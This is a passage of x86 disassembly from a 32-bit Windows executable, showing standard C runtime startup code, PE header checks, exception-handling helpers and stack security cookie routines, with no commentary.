  407ac1:	85 c0                	test   %eax,%eax
  407ac3:	74 17                	je     0x407adc
  407ac5:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407acc:	b8 ff 00 00 00       	mov    $0xff,%eax
  407ad1:	e9 20 01 00 00       	jmp    0x407bf6
  407ad6:	89 35 dc de 40 00    	mov    %esi,0x40dedc
  407adc:	a1 14 e2 40 00       	mov    0x40e214,%eax
  407ae1:	3b c6                	cmp    %esi,%eax
  407ae3:	75 1b                	jne    0x407b00
  407ae5:	68 7c 91 40 00       	push   $0x40917c
  407aea:	68 74 91 40 00       	push   $0x409174
  407aef:	e8 78 04 00 00       	call   0x407f6c
  407af4:	59                   	pop    %ecx
  407af5:	59                   	pop    %ecx
  407af6:	c7 05 14 e2 40 00 02 	movl   $0x2,0x40e214
  407afd:	00 00 00 
  407b00:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  407b03:	75 08                	jne    0x407b0d
  407b05:	53                   	push   %ebx
  407b06:	57                   	push   %edi
  407b07:	ff 15 64 90 40 00    	call   *0x409064
  407b0d:	39 1d 28 e2 40 00    	cmp    %ebx,0x40e228
  407b13:	74 19                	je     0x407b2e
  407b15:	68 28 e2 40 00       	push   $0x40e228
  407b1a:	e8 91 03 00 00       	call   0x407eb0
  407b1f:	59                   	pop    %ecx
  407b20:	85 c0                	test   %eax,%eax
  407b22:	74 0a                	je     0x407b2e
  407b24:	53                   	push   %ebx
  407b25:	6a 02                	push   $0x2
  407b27:	53                   	push   %ebx
  407b28:	ff 15 28 e2 40 00    	call   *0x40e228
  407b2e:	a1 e8 90 40 00       	mov    0x4090e8,%eax
  407b33:	8b 30                	mov    (%eax),%esi
  407b35:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407b38:	8a 06                	mov    (%esi),%al
  407b3a:	3c 20                	cmp    $0x20,%al
  407b3c:	77 49                	ja     0x407b87
  407b3e:	3a c3                	cmp    %bl,%al
  407b40:	74 05                	je     0x407b47
  407b42:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  407b45:	75 40                	jne    0x407b87
  407b47:	8a 06                	mov    (%esi),%al
  407b49:	3a c3                	cmp    %bl,%al
  407b4b:	74 0a                	je     0x407b57
  407b4d:	3c 20                	cmp    $0x20,%al
  407b4f:	77 06                	ja     0x407b57
  407b51:	46                   	inc    %esi
  407b52:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407b55:	eb f0                	jmp    0x407b47
  407b57:	f6 45 c0 01          	testb  $0x1,-0x40(%ebp)
  407b5b:	74 06                	je     0x407b63
  407b5d:	0f b7 45 c4          	movzwl -0x3c(%ebp),%eax
  407b61:	eb 03                	jmp    0x407b66
  407b63:	6a 0a                	push   $0xa
  407b65:	58                   	pop    %eax
  407b66:	50                   	push   %eax
  407b67:	56                   	push   %esi
  407b68:	53                   	push   %ebx
  407b69:	68 00 00 40 00       	push   $0x400000
  407b6e:	e8 7d c9 ff ff       	call   0x4044f0
  407b73:	a3 d8 de 40 00       	mov    %eax,0x40ded8
  407b78:	39 1d cc de 40 00    	cmp    %ebx,0x40decc
  407b7e:	75 5c                	jne    0x407bdc
  407b80:	50                   	push   %eax
  407b81:	ff 15 e4 90 40 00    	call   *0x4090e4
  407b87:	3c 22                	cmp    $0x22,%al
  407b89:	75 0b                	jne    0x407b96
  407b8b:	33 c9                	xor    %ecx,%ecx
  407b8d:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  407b90:	0f 94 c1             	sete   %cl
  407b93:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  407b96:	0f b6 c0             	movzbl %al,%eax
  407b99:	50                   	push   %eax
  407b9a:	ff 15 e0 90 40 00    	call   *0x4090e0
  407ba0:	59                   	pop    %ecx
  407ba1:	85 c0                	test   %eax,%eax
  407ba3:	74 04                	je     0x407ba9
  407ba5:	46                   	inc    %esi
  407ba6:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407ba9:	46                   	inc    %esi
  407baa:	eb 89                	jmp    0x407b35
  407bac:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407baf:	8b 08                	mov    (%eax),%ecx
  407bb1:	8b 09                	mov    (%ecx),%ecx
  407bb3:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  407bb6:	50                   	push   %eax
  407bb7:	51                   	push   %ecx
  407bb8:	e8 5d 02 00 00       	call   0x407e1a
  407bbd:	59                   	pop    %ecx
  407bbe:	59                   	pop    %ecx
  407bbf:	c3                   	ret
  407bc0:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407bc3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  407bc6:	a3 d8 de 40 00       	mov    %eax,0x40ded8
  407bcb:	33 db                	xor    %ebx,%ebx
  407bcd:	39 1d cc de 40 00    	cmp    %ebx,0x40decc
  407bd3:	75 07                	jne    0x407bdc
  407bd5:	50                   	push   %eax
  407bd6:	ff 15 d8 90 40 00    	call   *0x4090d8
  407bdc:	39 1d dc de 40 00    	cmp    %ebx,0x40dedc
  407be2:	75 06                	jne    0x407bea
  407be4:	ff 15 d4 90 40 00    	call   *0x4090d4
  407bea:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407bf1:	a1 d8 de 40 00       	mov    0x40ded8,%eax
  407bf6:	e8 ca 03 00 00       	call   0x407fc5
  407bfb:	c3                   	ret
  407bfc:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  407c01:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  407c08:	74 04                	je     0x407c0e
  407c0a:	33 c0                	xor    %eax,%eax
  407c0c:	eb 35                	jmp    0x407c43
  407c0e:	a1 3c 00 40 00       	mov    0x40003c,%eax
  407c13:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  407c1a:	45 00 00 
  407c1d:	75 eb                	jne    0x407c0a
  407c1f:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  407c24:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  407c2b:	75 dd                	jne    0x407c0a
  407c2d:	83 b8 74 00 40 00 0e 	cmpl   $0xe,0x400074(%eax)
  407c34:	76 d4                	jbe    0x407c0a
  407c36:	33 c9                	xor    %ecx,%ecx
  407c38:	39 88 e8 00 40 00    	cmp    %ecx,0x4000e8(%eax)
  407c3e:	0f 95 c1             	setne  %cl
  407c41:	8b c1                	mov    %ecx,%eax
  407c43:	6a 02                	push   $0x2
  407c45:	a3 cc de 40 00       	mov    %eax,0x40decc
  407c4a:	ff 15 04 91 40 00    	call   *0x409104
  407c50:	59                   	pop    %ecx
  407c51:	6a ff                	push   $0xffffffff
  407c53:	ff 15 50 90 40 00    	call   *0x409050
  407c59:	8b 0d ec de 40 00    	mov    0x40deec,%ecx
  407c5f:	a3 1c e2 40 00       	mov    %eax,0x40e21c
  407c64:	a3 20 e2 40 00       	mov    %eax,0x40e220
  407c69:	a1 00 91 40 00       	mov    0x409100,%eax
  407c6e:	89 08                	mov    %ecx,(%eax)
  407c70:	a1 fc 90 40 00       	mov    0x4090fc,%eax
  407c75:	8b 0d e8 de 40 00    	mov    0x40dee8,%ecx
  407c7b:	89 08                	mov    %ecx,(%eax)
  407c7d:	e8 4c 01 00 00       	call   0x407dce
  407c82:	e8 9f 03 00 00       	call   0x408026
  407c87:	83 3d d4 d5 40 00 00 	cmpl   $0x0,0x40d5d4
  407c8e:	75 0c                	jne    0x407c9c
  407c90:	68 26 80 40 00       	push   $0x408026
  407c95:	ff 15 f8 90 40 00    	call   *0x4090f8
  407c9b:	59                   	pop    %ecx
  407c9c:	e8 5d 03 00 00       	call   0x407ffe
  407ca1:	83 3d d0 d5 40 00 ff 	cmpl   $0xffffffff,0x40d5d0
  407ca8:	75 09                	jne    0x407cb3
  407caa:	6a ff                	push   $0xffffffff
  407cac:	ff 15 f4 90 40 00    	call   *0x4090f4
  407cb2:	59                   	pop    %ecx
  407cb3:	33 c0                	xor    %eax,%eax
  407cb5:	c3                   	ret
  407cb6:	e8 6e 03 00 00       	call   0x408029
  407cbb:	e9 63 fd ff ff       	jmp    0x407a23
  407cc0:	8b ff                	mov    %edi,%edi
  407cc2:	55                   	push   %ebp
  407cc3:	8b ec                	mov    %esp,%ebp
  407cc5:	8b 45 08             	mov    0x8(%ebp),%eax
  407cc8:	8b 00                	mov    (%eax),%eax
  407cca:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  407cd0:	75 2a                	jne    0x407cfc
  407cd2:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  407cd6:	75 24                	jne    0x407cfc
  407cd8:	8b 40 14             	mov    0x14(%eax),%eax
  407cdb:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  407ce0:	74 15                	je     0x407cf7
  407ce2:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  407ce7:	74 0e                	je     0x407cf7
  407ce9:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  407cee:	74 07                	je     0x407cf7
  407cf0:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  407cf5:	75 05                	jne    0x407cfc
  407cf7:	e8 c8 03 00 00       	call   0x4080c4
  407cfc:	33 c0                	xor    %eax,%eax
  407cfe:	5d                   	pop    %ebp
  407cff:	c2 04 00             	ret    $0x4
  407d02:	68 c0 7c 40 00       	push   $0x407cc0
  407d07:	ff 15 4c 90 40 00    	call   *0x40904c
  407d0d:	33 c0                	xor    %eax,%eax
  407d0f:	c3                   	ret
  407d10:	ff 25 cc 90 40 00    	jmp    *0x4090cc
  407d16:	6a 14                	push   $0x14
  407d18:	68 98 9c 40 00       	push   $0x409c98
  407d1d:	e8 5e 02 00 00       	call   0x407f80
  407d22:	ff 35 20 e2 40 00    	push   0x40e220
  407d28:	8b 35 48 90 40 00    	mov    0x409048,%esi
  407d2e:	ff d6                	call   *%esi
  407d30:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407d33:	83 f8 ff             	cmp    $0xffffffff,%eax
  407d36:	75 0c                	jne    0x407d44
  407d38:	ff 75 08             	push   0x8(%ebp)
  407d3b:	ff 15 18 91 40 00    	call   *0x409118
  407d41:	59                   	pop    %ecx
  407d42:	eb 64                	jmp    0x407da8
  407d44:	6a 08                	push   $0x8
  407d46:	e8 8b 03 00 00       	call   0x4080d6
  407d4b:	59                   	pop    %ecx
  407d4c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407d50:	ff 35 20 e2 40 00    	push   0x40e220
  407d56:	ff d6                	call   *%esi
  407d58:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407d5b:	ff 35 1c e2 40 00    	push   0x40e21c
  407d61:	ff d6                	call   *%esi
  407d63:	89 45 e0             	mov    %eax,-0x20(%ebp)
  407d66:	8d 45 e0             	lea    -0x20(%ebp),%eax
  407d69:	50                   	push   %eax
  407d6a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407d6d:	50                   	push   %eax
  407d6e:	ff 75 08             	push   0x8(%ebp)
  407d71:	8b 35 50 90 40 00    	mov    0x409050,%esi
  407d77:	ff d6                	call   *%esi
  407d79:	50                   	push   %eax
  407d7a:	e8 51 03 00 00       	call   0x4080d0
  407d7f:	83 c4 0c             	add    $0xc,%esp
  407d82:	89 45 dc             	mov    %eax,-0x24(%ebp)
  407d85:	ff 75 e4             	push   -0x1c(%ebp)
  407d88:	ff d6                	call   *%esi
  407d8a:	a3 20 e2 40 00       	mov    %eax,0x40e220
  407d8f:	ff 75 e0             	push   -0x20(%ebp)
  407d92:	ff d6                	call   *%esi
  407d94:	a3 1c e2 40 00       	mov    %eax,0x40e21c
  407d99:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407da0:	e8 09 00 00 00       	call   0x407dae
  407da5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407da8:	e8 18 02 00 00       	call   0x407fc5
  407dad:	c3                   	ret
  407dae:	6a 08                	push   $0x8
  407db0:	e8 15 03 00 00       	call   0x4080ca
  407db5:	59                   	pop    %ecx
  407db6:	c3                   	ret
  407db7:	8b ff                	mov    %edi,%edi
  407db9:	55                   	push   %ebp
  407dba:	8b ec                	mov    %esp,%ebp
  407dbc:	ff 75 08             	push   0x8(%ebp)
  407dbf:	e8 52 ff ff ff       	call   0x407d16
  407dc4:	f7 d8                	neg    %eax
  407dc6:	1b c0                	sbb    %eax,%eax
  407dc8:	f7 d8                	neg    %eax
  407dca:	59                   	pop    %ecx
  407dcb:	48                   	dec    %eax
  407dcc:	5d                   	pop    %ebp
  407dcd:	c3                   	ret
  407dce:	8b ff                	mov    %edi,%edi
  407dd0:	56                   	push   %esi
  407dd1:	b8 68 9c 40 00       	mov    $0x409c68,%eax
  407dd6:	be 68 9c 40 00       	mov    $0x409c68,%esi
  407ddb:	57                   	push   %edi
  407ddc:	8b f8                	mov    %eax,%edi
  407dde:	3b c6                	cmp    %esi,%eax
  407de0:	73 0f                	jae    0x407df1
  407de2:	8b 07                	mov    (%edi),%eax
  407de4:	85 c0                	test   %eax,%eax
  407de6:	74 02                	je     0x407dea
  407de8:	ff d0                	call   *%eax
  407dea:	83 c7 04             	add    $0x4,%edi
  407ded:	3b fe                	cmp    %esi,%edi
  407def:	72 f1                	jb     0x407de2
  407df1:	5f                   	pop    %edi
  407df2:	5e                   	pop    %esi
  407df3:	c3                   	ret
  407df4:	8b ff                	mov    %edi,%edi
  407df6:	56                   	push   %esi
  407df7:	b8 70 9c 40 00       	mov    $0x409c70,%eax
  407dfc:	be 70 9c 40 00       	mov    $0x409c70,%esi
  407e01:	57                   	push   %edi
  407e02:	8b f8                	mov    %eax,%edi
  407e04:	3b c6                	cmp    %esi,%eax
  407e06:	73 0f                	jae    0x407e17
  407e08:	8b 07                	mov    (%edi),%eax
  407e0a:	85 c0                	test   %eax,%eax
  407e0c:	74 02                	je     0x407e10
  407e0e:	ff d0                	call   *%eax
  407e10:	83 c7 04             	add    $0x4,%edi
  407e13:	3b fe                	cmp    %esi,%edi
  407e15:	72 f1                	jb     0x407e08
  407e17:	5f                   	pop    %edi
  407e18:	5e                   	pop    %esi
  407e19:	c3                   	ret
  407e1a:	ff 25 dc 90 40 00    	jmp    *0x4090dc
  407e20:	8b ff                	mov    %edi,%edi
  407e22:	55                   	push   %ebp
  407e23:	8b ec                	mov    %esp,%ebp
  407e25:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407e28:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  407e2d:	66 39 01             	cmp    %ax,(%ecx)
  407e30:	74 04                	je     0x407e36
  407e32:	33 c0                	xor    %eax,%eax
  407e34:	5d                   	pop    %ebp
  407e35:	c3                   	ret
  407e36:	8b 41 3c             	mov    0x3c(%ecx),%eax
  407e39:	03 c1                	add    %ecx,%eax
  407e3b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  407e41:	75 ef                	jne    0x407e32
  407e43:	33 d2                	xor    %edx,%edx
  407e45:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  407e4a:	66 39 48 18          	cmp    %cx,0x18(%eax)
  407e4e:	0f 94 c2             	sete   %dl
  407e51:	8b c2                	mov    %edx,%eax
  407e53:	5d                   	pop    %ebp
  407e54:	c3                   	ret
  407e55:	cc                   	int3
  407e56:	cc                   	int3
  407e57:	cc                   	int3
  407e58:	cc                   	int3
  407e59:	cc                   	int3
  407e5a:	cc                   	int3
  407e5b:	cc                   	int3
  407e5c:	cc                   	int3
  407e5d:	cc                   	int3
  407e5e:	cc                   	int3
  407e5f:	cc                   	int3
  407e60:	8b ff                	mov    %edi,%edi
  407e62:	55                   	push   %ebp
  407e63:	8b ec                	mov    %esp,%ebp
  407e65:	8b 45 08             	mov    0x8(%ebp),%eax
  407e68:	8b 48 3c             	mov    0x3c(%eax),%ecx
  407e6b:	03 c8                	add    %eax,%ecx
  407e6d:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  407e71:	53                   	push   %ebx
  407e72:	56                   	push   %esi
  407e73:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  407e77:	33 d2                	xor    %edx,%edx
  407e79:	57                   	push   %edi
  407e7a:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  407e7e:	85 f6                	test   %esi,%esi
  407e80:	74 1b                	je     0x407e9d
  407e82:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407e85:	8b 48 0c             	mov    0xc(%eax),%ecx
  407e88:	3b f9                	cmp    %ecx,%edi
  407e8a:	72 09                	jb     0x407e95
  407e8c:	8b 58 08             	mov    0x8(%eax),%ebx
  407e8f:	03 d9                	add    %ecx,%ebx
  407e91:	3b fb                	cmp    %ebx,%edi
  407e93:	72 0a                	jb     0x407e9f
  407e95:	42                   	inc    %edx
  407e96:	83 c0 28             	add    $0x28,%eax
  407e99:	3b d6                	cmp    %esi,%edx
  407e9b:	72 e8                	jb     0x407e85
  407e9d:	33 c0                	xor    %eax,%eax
  407e9f:	5f                   	pop    %edi
  407ea0:	5e                   	pop    %esi
  407ea1:	5b                   	pop    %ebx
  407ea2:	5d                   	pop    %ebp
  407ea3:	c3                   	ret
  407ea4:	cc                   	int3
  407ea5:	cc                   	int3
  407ea6:	cc                   	int3
  407ea7:	cc                   	int3
  407ea8:	cc                   	int3
  407ea9:	cc                   	int3
  407eaa:	cc                   	int3
  407eab:	cc                   	int3
  407eac:	cc                   	int3
  407ead:	cc                   	int3
  407eae:	cc                   	int3
  407eaf:	cc                   	int3
  407eb0:	8b ff                	mov    %edi,%edi
  407eb2:	55                   	push   %ebp
  407eb3:	8b ec                	mov    %esp,%ebp
  407eb5:	6a fe                	push   $0xfffffffe
  407eb7:	68 b8 9c 40 00       	push   $0x409cb8
  407ebc:	68 d9 7f 40 00       	push   $0x407fd9
  407ec1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407ec7:	50                   	push   %eax
  407ec8:	83 ec 08             	sub    $0x8,%esp
  407ecb:	53                   	push   %ebx
  407ecc:	56                   	push   %esi
  407ecd:	57                   	push   %edi
  407ece:	a1 d8 d5 40 00       	mov    0x40d5d8,%eax
  407ed3:	31 45 f8             	xor    %eax,-0x8(%ebp)
  407ed6:	33 c5                	xor    %ebp,%eax
  407ed8:	50                   	push   %eax
  407ed9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407edc:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407ee2:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407ee5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  407eec:	68 00 00 40 00       	push   $0x400000
  407ef1:	e8 2a ff ff ff       	call   0x407e20
  407ef6:	83 c4 04             	add    $0x4,%esp
  407ef9:	85 c0                	test   %eax,%eax
  407efb:	74 54                	je     0x407f51
  407efd:	8b 45 08             	mov    0x8(%ebp),%eax
  407f00:	2d 00 00 40 00       	sub    $0x400000,%eax
  407f05:	50                   	push   %eax
  407f06:	68 00 00 40 00       	push   $0x400000
  407f0b:	e8 50 ff ff ff       	call   0x407e60
  407f10:	83 c4 08             	add    $0x8,%esp
  407f13:	85 c0                	test   %eax,%eax
  407f15:	74 3a                	je     0x407f51
  407f17:	8b 40 24             	mov    0x24(%eax),%eax
  407f1a:	c1 e8 1f             	shr    $0x1f,%eax
  407f1d:	f7 d0                	not    %eax
  407f1f:	83 e0 01             	and    $0x1,%eax
  407f22:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407f29:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407f2c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407f33:	59                   	pop    %ecx
  407f34:	5f                   	pop    %edi
  407f35:	5e                   	pop    %esi
  407f36:	5b                   	pop    %ebx
  407f37:	8b e5                	mov    %ebp,%esp
  407f39:	5d                   	pop    %ebp
  407f3a:	c3                   	ret
  407f3b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407f3e:	8b 08                	mov    (%eax),%ecx
  407f40:	33 d2                	xor    %edx,%edx
  407f42:	81 39 05 00 00 c0    	cmpl   $0xc0000005,(%ecx)
  407f48:	0f 94 c2             	sete   %dl
  407f4b:	8b c2                	mov    %edx,%eax
  407f4d:	c3                   	ret
  407f4e:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407f51:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407f58:	33 c0                	xor    %eax,%eax
  407f5a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407f5d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407f64:	59                   	pop    %ecx
  407f65:	5f                   	pop    %edi
  407f66:	5e                   	pop    %esi
  407f67:	5b                   	pop    %ebx
  407f68:	8b e5                	mov    %ebp,%esp
  407f6a:	5d                   	pop    %ebp
  407f6b:	c3                   	ret
  407f6c:	ff 25 ec 90 40 00    	jmp    *0x4090ec
  407f72:	ff 25 f0 90 40 00    	jmp    *0x4090f0
  407f78:	cc                   	int3
  407f79:	cc                   	int3
  407f7a:	cc                   	int3
  407f7b:	cc                   	int3
  407f7c:	cc                   	int3
  407f7d:	cc                   	int3
  407f7e:	cc                   	int3
  407f7f:	cc                   	int3
  407f80:	68 d9 7f 40 00       	push   $0x407fd9
  407f85:	64 ff 35 00 00 00 00 	push   %fs:0x0
  407f8c:	8b 44 24 10          	mov    0x10(%esp),%eax
  407f90:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  407f94:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  407f98:	2b e0                	sub    %eax,%esp
  407f9a:	53                   	push   %ebx
  407f9b:	56                   	push   %esi
  407f9c:	57                   	push   %edi
  407f9d:	a1 d8 d5 40 00       	mov    0x40d5d8,%eax
  407fa2:	31 45 fc             	xor    %eax,-0x4(%ebp)
  407fa5:	33 c5                	xor    %ebp,%eax
  407fa7:	50                   	push   %eax
  407fa8:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407fab:	ff 75 f8             	push   -0x8(%ebp)
  407fae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407fb1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407fb8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407fbb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407fbe:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407fc4:	c3                   	ret
  407fc5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407fc8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407fcf:	59                   	pop    %ecx
  407fd0:	5f                   	pop    %edi
  407fd1:	5f                   	pop    %edi
  407fd2:	5e                   	pop    %esi
  407fd3:	5b                   	pop    %ebx
  407fd4:	8b e5                	mov    %ebp,%esp
  407fd6:	5d                   	pop    %ebp
  407fd7:	51                   	push   %ecx
  407fd8:	c3                   	ret
  407fd9:	8b ff                	mov    %edi,%edi
  407fdb:	55                   	push   %ebp
  407fdc:	8b ec                	mov    %esp,%ebp
  407fde:	ff 75 14             	push   0x14(%ebp)
  407fe1:	ff 75 10             	push   0x10(%ebp)
  407fe4:	ff 75 0c             	push   0xc(%ebp)
  407fe7:	ff 75 08             	push   0x8(%ebp)
  407fea:	68 dc 80 40 00       	push   $0x4080dc
  407fef:	68 d8 d5 40 00       	push   $0x40d5d8
  407ff4:	e8 f3 00 00 00       	call   0x4080ec
  407ff9:	83 c4 18             	add    $0x18,%esp
  407ffc:	5d                   	pop    %ebp
  407ffd:	c3                   	ret
  407ffe:	8b ff                	mov    %edi,%edi
  408000:	56                   	push   %esi
  408001:	68 00 00 03 00       	push   $0x30000
  408006:	68 00 00 01 00       	push   $0x10000
  40800b:	33 f6                	xor    %esi,%esi
  40800d:	56                   	push   %esi
  40800e:	e8 e5 00 00 00       	call   0x4080f8
  408013:	83 c4 0c             	add    $0xc,%esp
  408016:	85 c0                	test   %eax,%eax
  408018:	74 0a                	je     0x408024
  40801a:	56                   	push   %esi
  40801b:	56                   	push   %esi
  40801c:	56                   	push   %esi
  40801d:	56                   	push   %esi
  40801e:	56                   	push   %esi
  40801f:	e8 ce 00 00 00       	call   0x4080f2
  408024:	5e                   	pop    %esi
  408025:	c3                   	ret
  408026:	33 c0                	xor    %eax,%eax
  408028:	c3                   	ret
  408029:	8b ff                	mov    %edi,%edi
  40802b:	55                   	push   %ebp
  40802c:	8b ec                	mov    %esp,%ebp
  40802e:	83 ec 10             	sub    $0x10,%esp
  408031:	a1 d8 d5 40 00       	mov    0x40d5d8,%eax
  408036:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40803a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40803e:	53                   	push   %ebx
  40803f:	57                   	push   %edi
  408040:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  408045:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  40804a:	3b c7                	cmp    %edi,%eax
  40804c:	74 0d                	je     0x40805b
  40804e:	85 c3                	test   %eax,%ebx
  408050:	74 09                	je     0x40805b
  408052:	f7 d0                	not    %eax
  408054:	a3 dc d5 40 00       	mov    %eax,0x40d5dc
  408059:	eb 65                	jmp    0x4080c0
  40805b:	56                   	push   %esi
  40805c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40805f:	50                   	push   %eax
  408060:	ff 15 34 90 40 00    	call   *0x409034
  408066:	8b 75 fc             	mov    -0x4(%ebp),%esi
  408069:	33 75 f8             	xor    -0x8(%ebp),%esi
  40806c:	ff 15 38 90 40 00    	call   *0x409038
  408072:	33 f0                	xor    %eax,%esi
  408074:	ff 15 3c 90 40 00    	call   *0x40903c
  40807a:	33 f0                	xor    %eax,%esi
  40807c:	ff 15 40 90 40 00    	call   *0x409040
  408082:	33 f0                	xor    %eax,%esi
  408084:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408087:	50                   	push   %eax
  408088:	ff 15 44 90 40 00    	call   *0x409044
  40808e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408091:	33 45 f0             	xor    -0x10(%ebp),%eax
  408094:	33 f0                	xor    %eax,%esi
  408096:	3b f7                	cmp    %edi,%esi
  408098:	75 07                	jne    0x4080a1
  40809a:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  40809f:	eb 10                	jmp    0x4080b1
  4080a1:	85 f3                	test   %esi,%ebx
  4080a3:	75 0c                	jne    0x4080b1
  4080a5:	8b c6                	mov    %esi,%eax
  4080a7:	0d 11 47 00 00       	or     $0x4711,%eax
  4080ac:	c1 e0 10             	shl    $0x10,%eax
  4080af:	0b f0                	or     %eax,%esi
  4080b1:	89 35 d8 d5 40 00    	mov    %esi,0x40d5d8
  4080b7:	f7 d6                	not    %esi
  4080b9:	89 35 dc d5 40 00    	mov    %esi,0x40d5dc
  4080bf:	5e                   	pop    %esi
  4080c0:	5f                   	pop    %edi
  4080c1:	5b                   	pop    %ebx
  4080c2:	c9                   	leave
  4080c3:	c3                   	ret
  4080c4:	ff 25 08 91 40 00    	jmp    *0x409108
  4080ca:	ff 25 0c 91 40 00    	jmp    *0x40910c
  4080d0:	ff 25 10 91 40 00    	jmp    *0x409110
  4080d6:	ff 25 14 91 40 00    	jmp    *0x409114
  4080dc:	3b 0d d8 d5 40 00    	cmp    0x40d5d8,%ecx
  4080e2:	75 02                	jne    0x4080e6
  4080e4:	f3 c3                	repz ret
  4080e6:	e9 13 00 00 00       	jmp    0x4080fe
  4080eb:	cc                   	int3
  4080ec:	ff 25 1c 91 40 00    	jmp    *0x40911c
  4080f2:	ff 25 20 91 40 00    	jmp    *0x409120
  4080f8:	ff 25 24 91 40 00    	jmp    *0x409124
  4080fe:	8b ff                	mov    %edi,%edi
  408100:	55                   	push   %ebp
  408101:	8b ec                	mov    %esp,%ebp
  408103:	81 ec 28 03 00 00    	sub    $0x328,%esp
  408109:	a3 f8 df 40 00       	mov    %eax,0x40dff8
  40810e:	89 0d f4 df 40 00    	mov    %ecx,0x40dff4
  408114:	89 15 f0 df 40 00    	mov    %edx,0x40dff0
  40811a:	89 1d ec df 40 00    	mov    %ebx,0x40dfec
  408120:	89 35 e8 df 40 00    	mov    %esi,0x40dfe8
  408126:	89 3d e4 df 40 00    	mov    %edi,0x40dfe4
  40812c:	66 8c 15 10 e0 40 00 	data16 mov %ss,0x40e010
  408133:	66 8c 0d 04 e0 40 00 	data16 mov %cs,0x40e004
  40813a:	66 8c 1d e0 df 40 00 	data16 mov %ds,0x40dfe0
  408141:	66 8c 05 dc df 40 00 	data16 mov %es,0x40dfdc
  408148:	66 8c 25 d8 df 40 00 	data16 mov %fs,0x40dfd8
  40814f:	66 8c 2d d4 df 40 00 	data16 mov %gs,0x40dfd4
  408156:	9c                   	pushf
  408157:	8f 05 08 e0 40 00    	pop    0x40e008
  40815d:	8b 45 00             	mov    0x0(%ebp),%eax
  408160:	a3 fc df 40 00       	mov    %eax,0x40dffc
  408165:	8b 45 04             	mov    0x4(%ebp),%eax
  408168:	a3 00 e0 40 00       	mov    %eax,0x40e000
  40816d:	8d 45 08             	lea    0x8(%ebp),%eax
  408170:	a3 0c e0 40 00       	mov    %eax,0x40e00c
  408175:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  40817b:	c7 05 48 df 40 00 01 	movl   $0x10001,0x40df48
  408182:	00 01 00 
  408185:	a1 00 e0 40 00       	mov    0x40e000,%eax
  40818a:	a3 fc de 40 00       	mov    %eax,0x40defc
  40818f:	c7 05 f0 de 40 00 09 	movl   $0xc0000409,0x40def0
  408196:	04 00 c0 
  408199:	c7 05 f4 de 40 00 01 	movl   $0x1,0x40def4
  4081a0:	00 00 00 
  4081a3:	a1 d8 d5 40 00       	mov    0x40d5d8,%eax
